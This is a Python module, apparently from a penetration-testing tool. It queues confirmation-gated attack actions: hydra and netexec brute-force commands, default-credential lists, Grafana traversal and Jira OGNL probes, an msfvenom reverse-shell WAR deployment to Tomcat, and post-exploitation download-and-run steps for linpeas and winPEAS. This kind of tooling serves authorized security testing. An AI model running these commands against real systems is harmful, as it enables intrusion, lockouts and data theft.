"""Phase 4 — Engagement (interactive exploitation guidance).

Phase 4 is *not* an automated pipeline. It builds a queue of concrete
follow-up actions from Phase 1+2 findings, then waits for the user to
explicitly approve and execute each one. Every step is gated on a
risk-aware confirmation modal in the UI; nothing in this file calls
`execute_action` without an upstream confirmation.

The core loop is: build_action_queue → user picks → confirm → execute →
LLM parses output → suggest_followups → loop.

Action sources implemented here:
  - SSH brute force (hydra) when port 22 is open + we have usernames
  - SMB brute force (hydra) when 139/445 is open + we have usernames
  - Default-credential probes against detected web panel software
  - Metasploit module exec for confirmed CVEs
  - searchsploit detail dump for CVEs without an MSF module
  - Post-execution follow-ups (try ssh / smbclient / shell-id) added
    by `_followups_from_output` once a credential or shell is observed.

Risk policy
-----------
PASSIVE / LOW   — single-confirm dialog (UI handles).
MEDIUM          — single-confirm dialog with rationale shown.
HIGH            — double-confirm with explanation of impact.
CRITICAL        — user must type "I UNDERSTAND THIS ACTION".

`build_action_queue` and `execute_action` never gate on the risk —
gating is the UI's job. This file just owns *which command to run* and
*what to do with the output*. Keeping that boundary tight means the
queue can be trivially unit-tested.
"""

import asyncio
import os
import re
import shlex
import tempfile
import time
import uuid
from dataclasses import dataclass, field
from typing import AsyncIterator, Dict, List, Optional, Tuple

from ..llm import Finding, LLMClient
from ..tools.runner import (
    PhaseEvent, ScanContext, ScanState, is_rfc1918, stream,
)
from ..tools.toolcheck import is_available


PHASE = 4

# Risk badges in escalating order — drives both UI styling and the
# confirmation gate selection.
RISK_LEVELS = ("PASSIVE", "LOW", "MEDIUM", "HIGH", "CRITICAL")
CRITICAL_PHRASE = "I UNDERSTAND THIS ACTION"

# Default password-list candidates — first-existing wins. Matches the
# search order in phases.exploits._WORDLIST_CANDIDATES so the operator
# only has to install SecLists once.
_PASSWORD_LIST_CANDIDATES = [
    "/opt/homebrew/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt",
    "/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt",
    "/opt/homebrew/share/wordlists/rockyou.txt",
    "/usr/share/wordlists/rockyou.txt",
]

# Software → (login_path, credential pairs). Mirrors exposure.DEFAULT_CREDS
# but lives here too so Phase 4 can offer the action even when Phase 2's
# automatic exposure probe didn't run (e.g. profile=stealth).
DEFAULT_WEB_CREDS: Dict[str, List[Tuple[str, str]]] = {
    "grafana":    [("admin", "admin")],
    "jenkins":    [("admin", "admin"), ("admin", "password")],
    "tomcat":     [("tomcat", "tomcat"), ("admin", "admin")],
    "wordpress":  [("admin", "admin"), ("admin", "password")],
    "phpmyadmin": [("root", ""), ("root", "root")],
    "kibana":     [("elastic", "changeme")],
    "gitlab":     [("root", "5iveL!fe"), ("root", "password")],
}

# Cap on per-CVE searchsploit actions queued by `_action_searchsploit_unmsf`.
# Targets with massive Shodan vuln lists (100+ historical CVEs) used to
# generate one card per CVE and bury the actionable items. The aggregate
# InternetDB Finding in the findings panel still lists every CVE.
_SEARCHSPLOIT_CVE_CAP = 15


# Compact set of post-exploitation recon commands queued after a shell
# is gained (LLM-suggested, with a deterministic floor). Each is a
# MANUAL action — we surface the command but never run it ourselves
# because we don't own the gained session.
_POST_SHELL_RECON = (
    ("whoami",     "whoami",       "current user identity"),
    ("id",         "id",           "uid/gid + group membership"),
    ("uname -a",   "uname -a",     "kernel + arch fingerprint"),
    ("linpeas",    "linpeas.sh",   "Linux privilege-escalation enumerator"),
)


# ----------------------------------------------------------------------
# Data classes
# ----------------------------------------------------------------------


@dataclass
class DiscoveredUsername:
    """One harvested username + provenance + confidence.

    Confidence is the regex pattern's score in [0..1]. The cred-attack
    generator thresholds at >= 0.6 (so signature-style matches like
    sign-off lines don't poison hydra users.txt files), while the
    intel summary shows everything >= 0.5 with the source file inline.
    """
    username: str
    source_file: str = ""
    confidence: float = 0.5


@dataclass
class DiscoveredCredential:
    """One harvested credential / secret + provenance.

    `value` is the raw match — kept for downstream cred-reuse generation
    but NEVER displayed verbatim in the UI; renderers use
    `truncated_value()` which shows `<first-4>****`.
    `line_context` is the line from the source file the regex matched
    against, truncated to 80 chars so the operator has enough context
    without dumping the surrounding file.
    `is_critical` is set when the match came from CRITICAL_PATTERNS
    (private keys, AWS access keys, OAuth tokens, conn-strings with
    embedded creds) and forces the parent Finding to CRITICAL severity.
    """
    label: str
    value: str
    source_file: str = ""
    line_context: str = ""
    is_critical: bool = False

    def truncated_value(self) -> str:
        """First 4 chars + '****', or '****' for shorter values."""
        v = self.value or ""
        if len(v) <= 4:
            return "****"
        return v[:4] + "****"


@dataclass
class EngagementAction:
    """One concrete, user-approvable action.

    `command` is the *literal* argv that will be executed — no
    placeholders, no shell parsing — so the UI can show it verbatim
    before the user confirms. Operators can edit it in-place via the
    Edit Command dialog; whatever is in the list at execute time is
    exactly what runs.
    """
    name: str
    description: str
    command: List[str]
    risk: str                         # PASSIVE/LOW/MEDIUM/HIGH/CRITICAL
    expected_output: str              # what success looks like
    required_tool: str
    rationale: str = ""               # longer explanation for the Explain button
    finding_ref: str = ""             # what triggered this
    # Bookkeeping
    id: str = field(default_factory=lambda: uuid.uuid4().hex[:8])
    status: str = "pending"           # pending/executing/completed/skipped/failed
    started_at: float = 0.0
    duration: float = 0.0
    rc: int = 0
    output_excerpt: str = ""
    summary: str = ""                 # LLM one-sentence after execution
    # MANUAL actions are advisory — the UI surfaces the command but the
    # Execute button is greyed out (think "run this yourself in your own
    # session"). Used for post-shell recon where we can't drive the
    # remote shell from here.
    manual_only: bool = False
    # Set when an action joins the queue via a follow-up event (hydra hit,
    # MSF session opened, etc.) so the UI can flag it as `NEW` for one
    # render pass. Cleared on next rebuild.
    is_new: bool = False


@dataclass
class EngagementLogEntry:
    """One row in the Engagement Timeline rendered into the report."""
    started_at: float
    duration: float
    name: str
    command: List[str]
    risk: str
    rc: int
    summary: str
    output_excerpt: str
    manual: bool = False

    @property
    def started_iso(self) -> str:
        return time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(self.started_at))


# ----------------------------------------------------------------------
# Data-driven engine
# ----------------------------------------------------------------------
#
# The action queue is generated from three lookup tables:
#
#   SERVICE_MATRIX       — port → credential-attack tool / cmd / risk
#   TECH_EXPLOITS        — tech name → action templates (CVE checks etc.)
#   POST_EXPLOIT_LINUX,
#   POST_EXPLOIT_WINDOWS — OS-specific post-credential recon
#
# Plus a wordlist policy:
#
#   WORDLIST_SETS        — context → ordered list of candidate paths
#
# `build_action_queue` is a thin assembly: it calls per-tier generators
# that consume these tables. Adding a new credential-attackable service
# = appending one row to SERVICE_MATRIX. Adding coverage for a new
# fingerprintable tech = appending one entry to TECH_EXPLOITS. No new
# functions, no special-cased helpers.
#
# Helpers that stay function-shaped (smb-null, enum4linux, kerbrute,
# subjack, ssh-auth-probe, the LDAP/SNMP/NFS/Redis/FTP/DNS one-shot
# probes) are intentionally NOT in SERVICE_MATRIX — they're not
# credential attacks, they're port-specific recon with bespoke output.


# Risk-tier sort key — pure-function, used by build_action_queue to
# present cards in escalating-risk order so an operator can scroll
# top-to-bottom from "cheap recon" to "phrase-confirm danger".
_RISK_SORT = {risk: i for i, risk in enumerate(RISK_LEVELS)}


# ----- Service Matrix ------------------------------------------------

@dataclass(frozen=True)
class ServiceCred:
    """Credential-attack template for one network service.

    `cmd_template` placeholders (filled at generation time):
      {host}        — primary host IP / hostname
      {port}        — service port (covers non-default ports)
      {users_file}  — path to materialized users.txt
      {wordlist}    — context-resolved wordlist path
      {domain}      — target domain (for AD-aware tools); '' for IP-only

    `wordlist_context` keys into WORDLIST_SETS. `gate` is an extra
    runtime predicate over ScanState; the generator skips entries whose
    gate returns False (e.g. SSH brute waits for password-auth probe).
    """
    name: str
    port: int
    tool: str
    cmd_template: Tuple[str, ...]
    wordlist_context: str = "ssh-prod"
    risk: str = "MEDIUM"
    gate_field: str = ""  # ScanState attr that must be truthy/True
    rationale: str = ""


# Every row here is one credential-attack action. Order ≈ risk-ish.
# Adding a row = adding queue coverage for that service.
SERVICE_MATRIX: Tuple[ServiceCred, ...] = (
    ServiceCred(
        name="ssh", port=22, tool="hydra",
        cmd_template=(
            "hydra", "-L", "{users_file}", "-P", "{wordlist}",
            "-t", "4", "-f", "ssh://{host}:{port}",
        ),
        wordlist_context="ssh", risk="MEDIUM",
        gate_field="ssh_password_auth_confirmed",
        rationale=(
            "Phase 2 surfaced usernames and the SSH probe confirmed "
            "password authentication is supported. Brute-forcing SSH is "
            "loud and may trip account lockouts — only run against "
            "systems you own or have explicit written authorization to "
            "test. -t 4 limits parallel attempts."
        ),
    ),
    ServiceCred(
        name="ftp", port=21, tool="hydra",
        cmd_template=(
            "hydra", "-L", "{users_file}", "-P", "{wordlist}",
            "-t", "4", "-f", "ftp://{host}:{port}",
        ),
        wordlist_context="ssh", risk="MEDIUM",
        rationale=(
            "FTP usually doesn't have account lockout, but auth "
            "attempts are logged. Worth a try once usernames are on "
            "hand — successful login means file write/read access "
            "directly without any further pivot."
        ),
    ),
    ServiceCred(
        name="telnet", port=23, tool="hydra",
        cmd_template=(
            "hydra", "-L", "{users_file}", "-P", "{wordlist}",
            "-t", "4", "-f", "telnet://{host}:{port}",
        ),
        wordlist_context="ssh", risk="MEDIUM",
        rationale=(
            "Telnet present in 2026 means legacy infrastructure or an "
            "appliance — these almost always have weak/default creds. "
            "No TLS so the brute-force traffic is plaintext on the "
            "wire."
        ),
    ),
    ServiceCred(
        name="smtp", port=25, tool="hydra",
        cmd_template=(
            "hydra", "-L", "{users_file}", "-P", "{wordlist}",
            "-t", "4", "-f", "smtp://{host}:{port}",
        ),
        wordlist_context="ssh-prod", risk="MEDIUM",
        rationale=(
            "Authenticated SMTP enables mail-relay abuse and internal "
            "phishing from a trusted source. Servers commonly accept "
            "PLAIN/LOGIN auth — weak passwords are exploitable directly."
        ),
    ),
    ServiceCred(
        name="pop3", port=110, tool="hydra",
        cmd_template=(
            "hydra", "-L", "{users_file}", "-P", "{wordlist}",
            "-t", "4", "-f", "pop3://{host}:{port}",
        ),
        wordlist_context="ssh-prod", risk="MEDIUM",
        rationale=(
            "POP3 auth gives mailbox read access. Frequently shares "
            "credentials with the SMTP/IMAP service on the same host."
        ),
    ),
    ServiceCred(
        name="imap", port=143, tool="hydra",
        cmd_template=(
            "hydra", "-L", "{users_file}", "-P", "{wordlist}",
            "-t", "4", "-f", "imap://{host}:{port}",
        ),
        wordlist_context="ssh-prod", risk="MEDIUM",
        rationale=(
            "IMAP auth gives full mailbox access (read + folder ops). "
            "Sharing creds across mail protocols is the norm."
        ),
    ),
    ServiceCred(
        name="smb", port=445, tool="netexec",
        cmd_template=(
            "netexec", "smb", "{host}", "-u", "{users_file}",
            "-p", "{wordlist}", "--continue-on-success",
        ),
        wordlist_context="smb", risk="HIGH",
        rationale=(
            "SMB lockout policies are aggressive — a dictionary attack "
            "can lock real-user accounts in seconds. netexec's "
            "--continue-on-success keeps spraying after a hit, which "
            "is what you want; pair with a short wordlist to limit "
            "attempts per account."
        ),
    ),
    ServiceCred(
        name="smb-legacy", port=139, tool="netexec",
        cmd_template=(
            "netexec", "smb", "{host}", "--port", "139",
            "-u", "{users_file}", "-p", "{wordlist}",
            "--continue-on-success",
        ),
        wordlist_context="smb", risk="HIGH",
        rationale=(
            "Same as 445/SMB but via the legacy NetBIOS port. Hits if "
            "modern clients are blocked but old ones aren't."
        ),
    ),
    ServiceCred(
        name="mssql", port=1433, tool="netexec",
        cmd_template=(
            "netexec", "mssql", "{host}", "-u", "{users_file}",
            "-p", "{wordlist}", "--continue-on-success",
        ),
        wordlist_context="ssh-prod", risk="MEDIUM",
        rationale=(
            "MSSQL `sa` weak passwords are still common in lab/legacy "
            "deployments. Successful auth + xp_cmdshell = SYSTEM-level "
            "RCE on the host."
        ),
    ),
    ServiceCred(
        name="mysql", port=3306, tool="hydra",
        cmd_template=(
            "hydra", "-L", "{users_file}", "-P", "{wordlist}",
            "-t", "4", "-f", "mysql://{host}:{port}",
        ),
        wordlist_context="ssh-prod", risk="MEDIUM",
        rationale=(
            "MySQL with weak root: read every database, write user "
            "files via `INTO OUTFILE`, occasionally chain to UDF-based "
            "code execution."
        ),
    ),
    ServiceCred(
        name="postgres", port=5432, tool="hydra",
        cmd_template=(
            "hydra", "-L", "{users_file}", "-P", "{wordlist}",
            "-t", "4", "-f", "postgres://{host}:{port}",
        ),
        wordlist_context="ssh-prod", risk="MEDIUM",
        rationale=(
            "PostgreSQL with weak `postgres` user: full DB access plus "
            "potentially `COPY ... PROGRAM` for command execution on "
            "older versions."
        ),
    ),
    ServiceCred(
        name="rdp", port=3389, tool="hydra",
        cmd_template=(
            "hydra", "-L", "{users_file}", "-P", "{wordlist}",
            "-t", "1", "-f", "rdp://{host}:{port}",
        ),
        wordlist_context="ssh-prod", risk="HIGH",
        rationale=(
            "RDP brute-force is loud and locks AD accounts fast. -t 1 "
            "(single thread) reduces lockout risk but expect an angry "
            "SOC. Consider password spray instead if usernames > 5."
        ),
    ),
    ServiceCred(
        name="vnc", port=5900, tool="hydra",
        cmd_template=(
            "hydra", "-P", "{wordlist}",
            "-t", "4", "-f", "vnc://{host}:{port}",
        ),
        wordlist_context="ssh-prod", risk="MEDIUM",
        rationale=(
            "Most VNC servers use a password-only auth model (no user). "
            "Hits a desktop session if cracked — instantly interactive."
        ),
    ),
    ServiceCred(
        name="winrm", port=5985, tool="netexec",
        cmd_template=(
            "netexec", "winrm", "{host}", "-u", "{users_file}",
            "-p", "{wordlist}", "--continue-on-success",
        ),
        wordlist_context="ssh-prod", risk="HIGH",
        rationale=(
            "WinRM auth gives PowerShell remoting — effectively a "
            "shell. Account lockout still applies. Same lockout caveat "
            "as SMB on this host."
        ),
    ),
)


# ----- Tech-driven exploit templates ---------------------------------

@dataclass(frozen=True)
class TechExploit:
    """One actionable check tied to a fingerprinted technology.

    `command` placeholders: {host}, {port}, {web_url}, {git_url}, {domain}.
    `needs` is a free-form requirement code consumed by the generator:
      ""             → no extra signal needed
      "web_url"      → action only fires when a web URL is known
      "git_exposed"  → state.git_exposed_url must be set
    """
    name: str
    description: str
    command: Tuple[str, ...]
    risk: str
    tool: str
    rationale: str
    expected_output: str = ""
    manual_only: bool = False
    needs: str = ""


# Tech name (lowercase, substring match against state.technologies and
# fetched-file content) → ordered list of applicable exploit checks.
# Adding coverage for a new platform is one entry.
TECH_EXPLOITS: Dict[str, Tuple[TechExploit, ...]] = {
    "wordpress": (
        TechExploit(
            name="WPScan vulnerability scan",
            description="wpscan against the WordPress install — version, plugin CVEs, user enum",
            command=("wpscan", "--url", "{web_url}", "--no-update",
                     "--random-user-agent", "--disable-tls-checks",
                     "--enumerate", "u,p,t"),
            risk="MEDIUM", tool="wpscan",
            rationale=(
                "WordPress is fingerprinted on the target. WPScan walks "
                "the install for outdated core/plugins/themes, harvests "
                "usernames via /?author= probes, and cross-references "
                "WPVulnDB for known CVEs. Read-only enumeration; no "
                "exploits sent."
            ),
            expected_output="Per-section: Version, Users (if enum allowed), Plugins, Vulnerabilities.",
            needs="web_url",
        ),
    ),
    "jenkins": (
        TechExploit(
            name="Jenkins script-console probe",
            description="curl /script — unauthenticated reach the Groovy console?",
            # curl's `-w "%{http_code}\n"` uses single braces — escape them
            # for `str.format` substitution below ({{...}} → literal {...}).
            command=("curl", "-sk", "-o", "/dev/null", "-w", "%{{http_code}}\\n",
                     "{web_url}/script"),
            risk="LOW", tool="curl",
            rationale=(
                "Jenkins ships with /script (a Groovy REPL) that should "
                "require admin auth. Misconfigured installs return 200 "
                "to anonymous GETs — at which point an attacker has "
                "RCE-as-Jenkins-user. This action only checks the HTTP "
                "code; doesn't send code."
            ),
            expected_output="200 = console reachable (CRITICAL); 401/403 = auth-walled.",
            needs="web_url",
        ),
        TechExploit(
            name="Jenkins default credentials (manual)",
            description="documented defaults: admin/admin, admin/password",
            command=("echo", "manual: try admin/admin, admin/password at {web_url}/login"),
            risk="MEDIUM", tool="echo", manual_only=True,
            rationale=(
                "Older Jenkins distributions shipped without forcing an "
                "initial admin password. Still seen in lab and legacy "
                "deployments. Web-login flows are too varied to "
                "automate reliably."
            ),
            needs="web_url",
        ),
    ),
    "tomcat": (
        TechExploit(
            name="Tomcat manager default credentials probe",
            description=(
                "curl /manager/html with documented Tomcat defaults — "
                "tomcat/tomcat, admin/admin, tomcat/s3cret, manager/manager"
            ),
            # `bash -c` lets us iterate the credential list and print
            # one HTTP code per pair. Doubled braces = literal { } for
            # curl's `-w` format directive after str.format substitution.
            command=(
                "bash", "-c",
                "for c in tomcat:tomcat admin:admin tomcat:s3cret "
                "manager:manager admin:tomcat tomcat:admin; do "
                "echo -n \"$c → \"; "
                "curl -sk --max-time 8 -u $c -o /dev/null "
                "-w \"HTTP %{{http_code}}\\n\" "
                "{web_url}/manager/html; done",
            ),
            risk="MEDIUM", tool="curl",
            rationale=(
                "Tomcat's /manager/html web interface accepts WAR file "
                "uploads — successful auth = drop-and-run RCE. Default "
                "credentials still surface on dev/staging deployments. "
                "Each pair gets one auth attempt; 200/302 means a hit, "
                "401/403 means rejected. Some appliance Tomcats (Splunk, "
                "Jamf) ship with `s3cret` as the default."
            ),
            expected_output=(
                "Per-pair line `<user>:<pass> → HTTP <code>`. 200 / 302 "
                "= manager unlocked; 401 = wrong cred; 403 = manager "
                "deployed but ACL-blocked from this IP."
            ),
            needs="web_url",
        ),
        TechExploit(
            name="Tomcat manager WAR upload (manual after cred hit)",
            description=(
                "after a default-cred hit, deploy a payload WAR to "
                "the manager and visit it for shell"
            ),
            command=(
                "echo",
                "manual: msfvenom -p java/jsp_shell_reverse_tcp "
                "LHOST=<you> LPORT=4444 -f war > shell.war; "
                "curl -u <cred> --upload-file shell.war "
                "{web_url}/manager/text/deploy?path=/shell; "
                "curl {web_url}/shell/",
            ),
            risk="HIGH", tool="echo", manual_only=True,
            rationale=(
                "Once /manager/html accepts your credentials, the "
                "manager API at /manager/text/deploy takes a WAR file "
                "upload and installs it under the path you choose. "
                "Visiting the WAR triggers code execution as the Tomcat "
                "user. The cred-probe action above is the gate; this is "
                "the obvious follow-up."
            ),
            needs="web_url",
        ),
    ),
    "apache": (
        TechExploit(
            name="Apache server-status probe",
            description="curl /server-status — request stats, vhosts, client IPs",
            command=(
                "curl", "-skL", "--max-time", "8",
                "-w", "\\nHTTP %{{http_code}}\\n",
                "{web_url}/server-status",
            ),
            risk="MEDIUM", tool="curl",
            rationale=(
                "mod_status is a built-in Apache module; when "
                "ExtendedStatus is on and the location ACL is loose, "
                "/server-status leaks every active request including "
                "client IPs, request paths, and the URI of any auth "
                "headers in flight. Quietly read-only. 403 means the "
                "module is enabled but the location is restricted; 404 "
                "means mod_status isn't loaded."
            ),
            expected_output=(
                "On exposure: HTML table of `Srv / PID / Acc / M / "
                "CPU / SS / Req / Conn / Child / Slot / Client / "
                "VHost / Request`. 403/404 means closed."
            ),
            needs="web_url",
        ),
        TechExploit(
            name="Apache server-info probe",
            description="curl /server-info — module config + ServerRoot",
            command=(
                "curl", "-skL", "--max-time", "8",
                "-w", "\\nHTTP %{{http_code}}\\n",
                "{web_url}/server-info",
            ),
            risk="LOW", tool="curl",
            rationale=(
                "mod_info dumps the parsed Apache config (modules "
                "loaded, virtual hosts, directives in effect, "
                "ServerRoot path). Less directly exploitable than "
                "server-status but reveals the attack surface — module "
                "list often shows a vulnerable mod_php / mod_cgi / "
                "mod_proxy you can target next."
            ),
            needs="web_url",
        ),
    ),
    "struts": (
        TechExploit(
            name="Struts RCE check (CVE-2017-5638)",
            description="searchsploit dump for Struts 2.5.12",
            command=("searchsploit", "struts", "2.5.12"),
            risk="HIGH", tool="searchsploit",
            rationale=(
                "Apache Struts is fingerprinted. CVE-2017-5638 is "
                "unauthenticated RCE via a crafted Content-Type header "
                "— running the actual exploit is HIGH-impact and must "
                "be authorized in writing. This action only enumerates "
                "available exploits; no payload is sent."
            ),
            expected_output="title + EDB-ID + local path of any Struts exploits.",
        ),
    ),
    "phpmyadmin": (
        TechExploit(
            name="phpMyAdmin default credentials (manual)",
            description="defaults: root/root, root/(empty)",
            command=("echo", "manual: try root/root, root/(empty) at {web_url}"),
            risk="MEDIUM", tool="echo", manual_only=True,
            rationale=(
                "phpMyAdmin fronts a MySQL database. Defaults still "
                "surface in lab/legacy deployments; a hit is direct DB "
                "access with whatever the configured account permits."
            ),
            needs="web_url",
        ),
    ),
    "grafana": (
        TechExploit(
            name="Grafana path-traversal CVE-2021-43798 probe",
            description=(
                "GET /public/plugins/alertlist/../../../../../../../../etc/passwd"
            ),
            command=(
                "curl", "-skL",
                "{web_url}/public/plugins/alertlist/"
                "../../../../../../../../etc/passwd",
            ),
            risk="MEDIUM", tool="curl",
            rationale=(
                "Grafana 8.0.0–8.3.0 are vulnerable to CVE-2021-43798 — "
                "directory traversal via plugin assets reads arbitrary "
                "files as the grafana user. Read-only; tells you "
                "version exposure without exploitation."
            ),
            expected_output=(
                "On vulnerable versions: contents of /etc/passwd. On "
                "patched: 404 or HTML error page."
            ),
            needs="web_url",
        ),
        TechExploit(
            name="Grafana default credentials (manual)",
            description="defaults: admin/admin",
            command=("echo", "manual: try admin/admin at {web_url}/login"),
            risk="MEDIUM", tool="echo", manual_only=True,
            rationale=(
                "Grafana ships requiring a password change on first "
                "admin login but the change is skippable. Still seen on "
                "auto-provisioned deployments."
            ),
            needs="web_url",
        ),
    ),
    "gitlab": (
        TechExploit(
            name="GitLab version probe",
            description="GET /help/ for version banner",
            command=("curl", "-sk", "{web_url}/help/"),
            risk="LOW", tool="curl",
            rationale=(
                "GitLab leaks its version in the /help/ page. Pair the "
                "version with a CVE search — recent series have multiple "
                "unauth RCE chains (CVE-2021-22205 ExifTool, "
                "CVE-2023-7028 password-reset)."
            ),
            needs="web_url",
        ),
    ),
    "elasticsearch": (
        TechExploit(
            name="Elasticsearch unauthenticated index dump",
            description="GET /_cat/indices?v — list every index without auth",
            command=("curl", "-sk", "{web_url}/_cat/indices?v"),
            risk="HIGH", tool="curl",
            rationale=(
                "Elasticsearch defaults to no authentication on bare "
                "deployments — the indexes-listing endpoint returns "
                "every database the cluster holds. Frequently includes "
                "production data dumps, log archives, PII. Read-only "
                "but the data leaving the network is the breach."
            ),
            expected_output=(
                "Tab-separated table of indexes. Empty / 401 / 403 = "
                "authenticated cluster."
            ),
            needs="web_url",
        ),
    ),
    "jira": (
        TechExploit(
            name="Jira CVE-2021-26084 OGNL probe",
            description="OGNL injection via /s/<chars>/_/;/WEB-INF/web.xml",
            command=(
                "curl", "-sk",
                "{web_url}/s/0123456789012345678901234567890123456789"
                "/_/;/WEB-INF/web.xml",
            ),
            risk="HIGH", tool="curl",
            rationale=(
                "Jira Server/Data Center ≤ 8.13.6 is vulnerable to "
                "CVE-2021-26084 — pre-auth OGNL injection via the "
                "Jira Server template path. Confirming the path returns "
                "200 with web.xml content tells you the server is "
                "vulnerable; running the actual payload is HIGH-impact."
            ),
            needs="web_url",
        ),
    ),
    "roundcube": (
        TechExploit(
            name="Roundcube version probe",
            description="GET / + look for X-Powered-By or version meta",
            command=("curl", "-skI", "{web_url}/"),
            risk="LOW", tool="curl",
            rationale=(
                "Roundcube has had multiple recent RCE chains — "
                "CVE-2024-37383 (XSS-via-SVG-mathml), "
                "CVE-2024-42008/9/10 (chain to RCE). Headers usually "
                "leak the version; cross-reference exploit-db."
            ),
            needs="web_url",
        ),
    ),
    # Special: structural finding rather than fingerprinted tech name.
    # Triggered when state.git_exposed_url is set (Phase 2 detected /.git/).
    "git-exposed": (
        TechExploit(
            name="Gitleaks scan of exposed .git/",
            description="git clone {git_url} → gitleaks scan every commit for secrets",
            command=(
                "bash", "-c",
                "rm -rf /tmp/vulnscout-gitleaks && "
                "git clone {git_url} /tmp/vulnscout-gitleaks 2>&1 && "
                "gitleaks detect --source /tmp/vulnscout-gitleaks "
                "--no-git -v",
            ),
            risk="HIGH", tool="gitleaks",
            rationale=(
                "Phase 2 confirmed /.git/ is web-exposed at {git_url}. "
                "When a /.git/ directory leaks, the entire commit "
                "history is downloadable — including secrets that were "
                "committed once and 'fixed' later. Gitleaks walks every "
                "blob in every commit looking for credentials, API "
                "keys, and tokens. If the repo is the live app's source "
                "code, this is usually total compromise: any secret "
                "ever committed is recoverable."
            ),
            expected_output="Per-finding: Finding / RuleID / Commit / File.",
            needs="git_exposed",
        ),
    ),
}


# ----- OS detection + post-exploitation templates --------------------

@dataclass(frozen=True)
class PostExploitAction:
    """Manual post-credential recon command for a specific OS family.

    All entries default to manual_only=True — they're meant to run
    inside the gained shell on the target, not via vulnscout's local
    subprocess. Surfacing them as queue cards gives an operator a
    checklist + clipboard-ready command.
    """
    name: str
    cmd_text: str       # what the operator pastes
    rationale: str
    risk: str = "LOW"


POST_EXPLOIT_LINUX: Tuple[PostExploitAction, ...] = (
    PostExploitAction(
        name="Linux post: linpeas",
        cmd_text=(
            "curl -L https://github.com/peass-ng/PEASS-ng/releases/"
            "latest/download/linpeas.sh | sh"
        ),
        rationale=(
            "linpeas.sh is the standard Linux privilege-escalation "
            "enumerator — it walks every common misconfig (writable "
            "/etc/passwd, vulnerable SUID, sudo NOPASSWD, kernel CVEs, "
            "weak service permissions). One-shot script, ~5min runtime."
        ),
    ),
    PostExploitAction(
        name="Linux post: sudo -l",
        cmd_text="sudo -l",
        rationale=(
            "Lists the commands the current user can run via sudo "
            "without a password. NOPASSWD entries on shells, editors, "
            "or arbitrary binaries (gtfobins.github.io) are direct root "
            "paths."
        ),
    ),
    PostExploitAction(
        name="Linux post: SUID binary search",
        cmd_text="find / -perm -4000 -type f 2>/dev/null",
        rationale=(
            "SUID-root binaries run as root regardless of the calling "
            "user. Cross-reference results with gtfobins for known "
            "privilege-escalation chains (e.g. /usr/bin/find -exec, "
            "/usr/bin/vim.basic, /usr/bin/python3 with cap_setuid)."
        ),
    ),
    PostExploitAction(
        name="Linux post: crontab inspection",
        cmd_text="cat /etc/crontab; ls -la /etc/cron.*",
        rationale=(
            "System cron jobs run as root. World-writable cron scripts "
            "or scripts in writable directories are direct privesc — "
            "edit and wait for the next minute."
        ),
    ),
    PostExploitAction(
        name="Linux post: /etc/passwd dump",
        cmd_text="cat /etc/passwd",
        rationale=(
            "Lists every local account, their default shell, and their "
            "home directory. Combined with /etc/shadow access (root or "
            "shadow-group), feeds offline cracking. Also reveals "
            "service accounts and their UIDs."
        ),
    ),
    PostExploitAction(
        name="Linux post: kernel + arch",
        cmd_text="uname -a; cat /etc/os-release",
        rationale=(
            "Kernel version + distribution reveal applicable "
            "kernel-CVE exploits (Dirty Pipe, OverlayFS, etc.). "
            "Cross-reference exploit-db before running anything kernel-"
            "level — wrong kernel = panic."
        ),
    ),
)

POST_EXPLOIT_WINDOWS: Tuple[PostExploitAction, ...] = (
    PostExploitAction(
        name="Windows post: winpeas",
        cmd_text=(
            "iwr -Uri https://github.com/peass-ng/PEASS-ng/releases/"
            "latest/download/winPEASx64.exe -OutFile winpeas.exe; "
            ".\\winpeas.exe"
        ),
        rationale=(
            "winPEAS is the Windows analogue of linpeas — walks user "
            "context, services, registry autoruns, scheduled tasks, "
            "AlwaysInstallElevated, AppLocker bypasses, "
            "unquoted-service-paths. ~3min runtime."
        ),
    ),
    PostExploitAction(
        name="Windows post: whoami /all",
        cmd_text="whoami /all",
        rationale=(
            "Dumps the current token's user, groups, and privileges. "
            "SeImpersonatePrivilege / SeAssignPrimaryToken on the list "
            "= JuicyPotato / RoguePotato territory; SeBackupPrivilege "
            "= NTDS.dit shadow-copy access."
        ),
    ),
    PostExploitAction(
        name="Windows post: systeminfo",
        cmd_text="systeminfo",
        rationale=(
            "OS build number + applied hotfixes feed Windows-Exploit-"
            "Suggester for kernel-CVE candidates. Domain field tells "
            "you whether you're on a domain-joined host (vs WORKGROUP)."
        ),
    ),
    PostExploitAction(
        name="Windows post: net commands",
        cmd_text="net user; net localgroup administrators; net session",
        rationale=(
            "Local user list + admin-group membership + active SMB "
            "sessions. Sessions reveal which accounts have touched the "
            "machine recently (impersonation / token-theft targets)."
        ),
    ),
    PostExploitAction(
        name="Windows post: AlwaysInstallElevated check",
        cmd_text=(
            "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer; "
            "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer"
        ),
        rationale=(
            "Both registry keys set to 1 = any user can install MSI "
            "packages as SYSTEM. Generate an MSI with msfvenom and "
            "msiexec /i it for instant SYSTEM."
        ),
    ),
)


def detect_os(state: ScanState) -> str:
    """Best-effort OS classification: 'linux' | 'windows' | 'unknown'.

    Sources, in order:
      1. nmap -O guess (most reliable when present)
      2. Open-port shape: RDP/WinRM strongly imply Windows; SMB without
         SSH leans Windows; SSH without RDP/SMB leans Linux.
      3. Service banners — `microsoft-`, `cifs`, `iis` → Windows.
    """
    os_lower = (state.os_guess or "").lower()
    if any(k in os_lower for k in (
        "windows", "microsoft", "win32", "win64",
    )):
        return "windows"
    if any(k in os_lower for k in (
        "linux", "ubuntu", "debian", "centos", "redhat",
        "alpine", "fedora", "kali", "arch",
    )):
        return "linux"

    open_ports = {p.port for p in state.open_ports}
    has_rdp = 3389 in open_ports
    has_winrm = bool({5985, 5986} & open_ports)
    has_smb = bool({139, 445} & open_ports)
    has_ssh = 22 in open_ports

    # Banner heuristics — service product strings include `microsoft-ds`,
    # `iis httpd`, `microsoft sql server`, etc.
    banner_blob = " ".join(
        (p.product or "") + " " + (p.service or "")
        for p in state.open_ports
    ).lower()
    if any(k in banner_blob for k in (
        "microsoft-ds", "microsoft sql", "microsoft iis",
        "windows", "cifs",
    )):
        return "windows"

    if has_rdp or has_winrm:
        return "windows"
    if has_smb and not has_ssh:
        return "windows"
    if has_ssh:
        return "linux"
    return "unknown"


